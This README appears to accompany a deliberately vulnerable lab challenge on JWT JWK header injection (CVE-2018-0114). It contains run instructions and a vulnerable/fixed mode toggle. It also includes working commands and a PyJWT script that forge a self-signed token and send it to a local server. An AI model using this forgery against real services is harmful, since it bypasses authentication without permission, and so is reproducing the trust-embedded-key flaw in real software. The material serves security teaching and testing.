# JWT JWK Header Injection

This challenge demonstrates a JWT implementation vulnerable to **CVE-2018-0114**: when the token header carries an embedded `jwk` field, the server uses that self-declared key to verify the signature instead of checking it against its own pinned/trusted key. Since the attacker controls both the embedded key and the private key used to sign, they can forge a token that verifies successfully against itself.

## How to run it

```bash
go run main.go serve
```

## Modes

The server supports two modes, toggled with the `--vulnerable` flag on the `serve` command (defaults to `true`):

```bash
# vulnerable: an embedded jwk header is trusted as the verification key
go run main.go serve --vulnerable=true

# fixed: the jwk header is ignored, verification always uses the server's pinned key
go run main.go serve --vulnerable=false
```

## How to exploit it

```bash
# Get a sample legit token — no jwk header, verified against the server's pinned key
TOKEN=$(go run main.go jwt)
curl -i http://localhost:8080/ -H "Authorization: Bearer $TOKEN"

# Forge a token: embed a self-signed JWK in the header and re-sign with it
FORGED=$(jwtop exploit jwkinjection "$TOKEN")
curl -i http://localhost:8080/ -H "Authorization: Bearer $FORGED"
```

Equivalent without `jwtop`, using PyJWT:

```bash
python3 -c "
import json
from cryptography.hazmat.primitives.asymmetric import rsa
import jwt
from jwt.algorithms import RSAAlgorithm

key = rsa.generate_private_key(public_exponent=65537, key_size=2048)
jwk = json.loads(RSAAlgorithm.to_jwk(key.public_key()))
jwk.update(kid='attacker-key', alg='RS256', use='sig')

forged = jwt.encode(
    {'sub': 'attacker'},
    key,
    algorithm='RS256',
    headers={'kid': 'attacker-key', 'jwk': jwk},
)
print(forged)
" > /tmp/forged_token.txt

FORGED=$(cat /tmp/forged_token.txt)
curl -i http://localhost:8080/ -H "Authorization: Bearer $FORGED"
```

## Disclaimer

The challenges provided in this repository are designed to be educational and for testing purposes only. Do not attempt to exploit vulnerabilities in systems or APIs without proper authorization. Always ensure that you have the necessary permissions to conduct security testing on any system or application.

---

Learn more about API security at [Cerberauth](https://www.cerberauth.com/)
